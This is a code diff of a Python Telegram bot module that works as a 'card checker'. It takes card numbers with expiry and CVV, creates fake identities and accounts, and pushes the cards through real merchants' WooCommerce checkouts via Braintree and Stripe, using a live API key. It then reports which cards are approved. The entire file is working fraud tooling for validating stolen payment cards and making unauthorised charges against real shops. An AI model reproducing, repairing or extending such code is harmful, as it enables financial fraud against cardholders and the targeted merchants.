@@ -1,252 +1,154 @@
-import os
-import re
-import base64
-import random
-import string
 import requests
-import user_agent
+import random
 import time
 
-def generate_full_name():
-    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour",
-                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
-                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
-                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
-                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
-                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
-                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
-                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
-                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
-                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
+def generate_random_email():
+    first = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4))
+    last = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4))
+    digits = "".join(random.choices("0123456789", k=6))
+    return f"{first}{last}{digits}@gmail.com"
 
-    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
-                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
-                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
-                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
-                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
-                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
-                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
-                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
+def generate_guid():
+    import uuid
+    return str(uuid.uuid4())
 
-    full_name = random.choice(first_names) + " " + random.choice(last_names)
-    first_name, last_name = full_name.split()
-    return first_name, last_name
-
-def generate_address():
-    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
-    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
-    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
-    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
-
-    city = random.choice(cities)
-    state = states[cities.index(city)]
-    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
-    zip_code = zip_codes[states.index(state)]
-    return city, state, street_address, zip_code
-
-def generate_random_account():
-    name = ''.join(random.choices(string.ascii_lowercase, k=20))
-    number = ''.join(random.choices(string.digits, k=4))
-    return f"{name}{number}@gmail.com"
-
-def generate_random_code(length=32):
-    letters_and_digits = string.ascii_letters + string.digits
-    return ''.join(random.choice(letters_and_digits) for _ in range(length))
-
-def check_nonsk3(ccx):
-    ccx = ccx.strip()
-    n = ccx.split("|")[0]
-    mm = ccx.split("|")[1]
-    yy = ccx.split("|")[2]
-    cvc = ccx.split("|")[3]
-    if "20" in yy:
-        yy = yy.split("20")[1]
-        
-    user = user_agent.generate_user_agent()
-    r = requests.session()
-    r.verify = False
-
-    first_name, last_name = generate_full_name()
-    city, state, street_address, zip_code = generate_address()
-    acc = generate_random_account()
-    username = ''.join(random.choices(string.ascii_lowercase, k=20)) + ''.join(random.choices(string.digits, k=20))
-    num = '303' + ''.join(random.choices(string.digits, k=7))
-    corr = generate_random_code()
-    sess = generate_random_code()
-
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'cache-control': 'no-cache',
-        'pragma': 'no-cache',
-        'user-agent': user,
-    }
-
-    response = r.get('https://forfullflavor.com/my-account/', headers=headers)
-    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
-
-    headers['content-type'] = 'application/x-www-form-urlencoded'
-    data = {
-        'username': username,
-        'email': acc,
-        'woocommerce-register-nonce': register,
-        '_wp_http_referer': '/my-account/',
-        'register': 'Register',
-    }
-
-    response = r.post('https://forfullflavor.com/my-account/', headers=headers, data=data)
-
-    response = r.get('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
-    address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
-
-    data = {
-        'billing_first_name': first_name,
-        'billing_last_name': last_name,
-        'billing_company': '',
-        'billing_country': 'US',
-        'billing_address_1': street_address,
-        'billing_address_2': '',
-        'billing_city': city,
-        'billing_state': state,
-        'billing_postcode': zip_code,
-        'billing_phone': num,
-        'billing_email': acc,
-        'save_address': 'Save address',
-        'woocommerce-edit-address-nonce': address,
-        '_wp_http_referer': '/my-account/edit-address/billing/',
-        'action': 'edit_address',
-    }
-
-    response = r.post('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
-
-    response = r.get('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
-    add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-    client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
-
-    data = {
-        'action': 'wc_braintree_credit_card_get_client_token',
-        'nonce': client,
-    }
-
-    response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
-    enc = response.json()['data']
-    dec = base64.b64decode(enc).decode('utf-8')
-    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
-
-    headers = {
-        'authority': 'payments.braintree-api.com',
-        'accept': '*/*',
-        'authorization': f'Bearer {au}',
-        'braintree-version': '2018-05-10',
-        'cache-control': 'no-cache',
-        'content-type': 'application/json',
-        'pragma': 'no-cache',
-        'user-agent': user,
-    }
-
-    json_data = {
-    'clientSdkMetadata': {
-        'source': 'client',
-        'integration': 'custom',
-        'sessionId': '9c8cc072-4588-4af4-b73e-a4f0d2af84e4',
-    },
-    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
-    'variables': {
-        'input': {
-            'creditCard': {
-                'number': n,
-                'expirationMonth': mm,
-                'expirationYear': yy,
-                'cvv': cvc,
-            },
-            'options': {
-                'validate': False,
-            },
-        },
-    },
-    'operationName': 'TokenizeCreditCard',
-}
-
-    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-
+def get_str(source, start, end):
     try:
-        tok = response.json()['data']['tokenizeCreditCard']['token']
-    except KeyError:
-        return f"Failed to tokenize card: {response.text}"
+        return source.split(start)[1].split(end)[0]
+    except IndexError:
+        return ""
 
+def check_nonsk3_card(card):
+    cc, mon, year, cvv = card.split('|')
+    session = requests.Session()
+
+    # Step 1: Get random user info
+    response = session.get("https://randomuser.me/api?nat=gb")
+    user_info = response.json()
+    first_name = user_info['results'][0]['name']['first']
+    last_name = user_info['results'][0]['name']['last']
+    email = generate_random_email()
+
+    # Step 2: Add to cart
+    add_to_cart_data = {
+        "price": 5,
+        "product_name": "Mini Heart",
+        "product_sku": "",
+        "product_id": 1690,
+        "quantity": 1
+    }
+    session.post("https://yiliexpressions.com/?wc-ajax=add_to_cart", data=add_to_cart_data)
+
+    # Step 3: Checkout
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'cache-control': 'no-cache',
-        'content-type': 'application/x-www-form-urlencoded',
-        'pragma': 'no-cache',
-        'user-agent': user,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
     }
+    response = session.get("https://yiliexpressions.com/checkout/", headers=headers)
+    nonce = get_str(response.text, 'name="woocommerce-process-checkout-nonce" value="', '"')
 
-    data = {
-        'payment_method': 'braintree_credit_card',
-        'wc-braintree-credit-card-card-type': 'master-card',
-        'wc-braintree-credit-card-3d-secure-enabled': '',
-        'wc-braintree-credit-card-3d-secure-verified': '',
-        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-        'wc_braintree_credit_card_payment_nonce': tok,
-        'wc_braintree_device_data': '',
-        'wc-braintree-credit-card-tokenize-payment-method': 'true',
-        'woocommerce-add-payment-method-nonce': add_nonce,
-        '_wp_http_referer': '/my-account/add-payment-method/',
-        'woocommerce_add_payment_method': '1',
+    # Step 4: Create payment method
+    payment_method_data = {
+        "type": "card",
+        "billing_details[name]": f"{first_name} {last_name}",
+        "billing_details[address][line1]": "112 Street",
+        "billing_details[address][state]": "NY",
+        "billing_details[address][city]": "New York",
+        "billing_details[address][postal_code]": "10010",
+        "billing_details[address][country]": "US",
+        "billing_details[email]": email,
+        "billing_details[phone]": "5189410151",
+        "card[number]": cc,
+        "card[cvc]": cvv,
+        "card[exp_month]": mon,
+        "card[exp_year]": year,
+        "guid": generate_guid(),
+        "muid": generate_guid(),
+        "sid": generate_guid(),
+        "pasted_fields": "number",
+        "payment_user_agent": "stripe.js%2F8f42a78e50%3B+stripe-js-v3%2F8f42a78e50%3B+split-card-element",
+        "referrer": "https%3A%2F%2Fyiliexpressions.com",
+        "time_on_page": "44000",
+        "key": "pk_live_51HP442GWWn7aXlGRHviywylRO4zh9jGXW2Hi1NZ4jrFQz0e7f0TGargqoQWBbUo7uIDjPh3bMfq0y4fptS2K3oIH00UsKSbfoq"
     }
+    response = session.post("https://api.stripe.com/v1/payment_methods", data=payment_method_data, headers=headers)
+    payment_method_id = get_str(response.text, '"id": "', '"')
 
-    response = r.post('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+    # Step 5: Confirm order
+    checkout_data = {
+        "billing_first_name": first_name,
+        "billing_last_name": last_name,
+        "billing_company": "",
+        "billing_country": "US",
+        "billing_address_1": "112 Street",
+        "billing_address_2": "",
+        "billing_city": "New York",
+        "billing_state": "NY",
+        "billing_postcode": "10010",
+        "billing_phone": "5189410151",
+        "billing_email": email,
+        "account_password": "",
+        "ship_to_different_address": 1,
+        "shipping_first_name": "James",
+        "shipping_last_name": "DE",
+        "shipping_company": "",
+        "shipping_country": "US",
+        "shipping_address_1": "112 Street",
+        "shipping_address_2": "",
+        "shipping_city": "New York",
+        "shipping_state": "NY",
+        "shipping_postcode": "10010",
+        "order_comments": "",
+        "wc_order_attribution_type": "typein",
+        "wc_order_attribution_url": "(none)",
+        "wc_order_attribution_utm_campaign": "(none)",
+        "wc_order_attribution_utm_source": "(direct)",
+        "wc_order_attribution_utm_medium": "(none)",
+        "wc_order_attribution_utm_content": "(none)",
+        "wc_order_attribution_utm_id": "(none)",
+        "wc_order_attribution_utm_term": "(none)",
+        "wc_order_attribution_session_entry": "https%3A%2F%2Fyiliexpressions.com%2F",
+        "wc_order_attribution_session_start_time": "2024-01-30+20%3A58%3A36",
+        "wc_order_attribution_session_pages": 10,
+        "wc_order_attribution_session_count": 1,
+        "wc_order_attribution_user_agent": "Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F121.0.0.0+Safari%2F537.36+Edg%2F121.0.0.0",
+        "shipping_method[0]": "local_pickup%3A13",
+        "payment_method": "stripe",
+        "woocommerce-process-checkout-nonce": nonce,
+        "stripe_source": payment_method_id,
+        "_wp_http_referer": "/?wc-ajax=update_order_review"
+    }
+    response = session.post("https://yiliexpressions.com/?wc-ajax=checkout", data=checkout_data, headers=headers)
+    response_text = response.text
 
-    text = response.text
-
-    pattern = r'Status code (.*?)\s*</li>'
-
-    match = re.search(pattern, text)
-    if match:
-        result = match.group(1)
-        if 'risk_threshold' in text:
-            result = "RISK: Retry this BIN later."
+    if "result\":\"success" in response_text:
+        return "Payment successful✅"
+    elif "result\":\"failure" in response_text:
+        error_message = get_str(response_text, '\\\"alert\\\">\\n\\t\\t\\t<li>\\n\\t\\t\\t', '\\t\\t<\\/li>\\n\\t<\\/ul>')
+        return f"Payment failed❌\nError: {error_message}"
+    elif "3Dwc_stripe_verify_intent" in response_text:
+        return "3D Secure authentication required🔒"
     else:
-        if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
-            result = "1000: Approved"
-        else:
-            result = "Error"
+        return "Payment status unknown❓"
 
-    if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
-        return 'Approved'
-    else:
-        return result
-
-def handle_nonsk3_command(bot, message):
+def process_nonsk3_command(bot, message):
     chat_id = message.chat.id
-    account_data = message.text.split()[1:]  # Get the account data from the command
-    if account_data:
-        total_accounts = len(account_data)
+    cc_data = message.text.split()[1:]  # Get the CC data from the command
+    if cc_data:
+        total_cards = len(cc_data)
         start_time = time.time()
         results = []
-        initial_message = "↯ NONSK3 CHECKER\n\n"
-        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))
+        initial_message = "↯ NONSK CHECKER-3\n\n"
+        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))
 
-        for account in account_data:
-            result = check_nonsk3(account)
-            results.append(f"Card: {account}\nResponse => {result}")
+        for card in cc_data:
+            result = check_nonsk3_card(card)
+            results.append(f"Card: {card}\nResult => {result}")
             bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=msg.message_id,
-                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
+                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
             )
 
     else:
-        bot.send_message(chat_id, "Please provide account details in the format: /nsk3 card_number|exp_month|exp_year|cvv")
+        bot.send_message(chat_id, "Please provide card details in the format: /nonsk3 cc|mon|year|cvv")
 
-def get_footer_info(total_accounts, start_time, username):
-    elapsed_time = time.time() - start_time
-    footer = (
-        f"－－－－－－－－－－－－－－－－\n"
-        f"🔹 Total Cards Checked - {total_accounts}\n"
-        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
-        f"▫️ Checked by: {username}\n"
-        f"⚡️ Bot by - AFTAB [BOSS]\n"
-        f"－－－－－－－－－－－－－－－－"
-    )
-    return footer
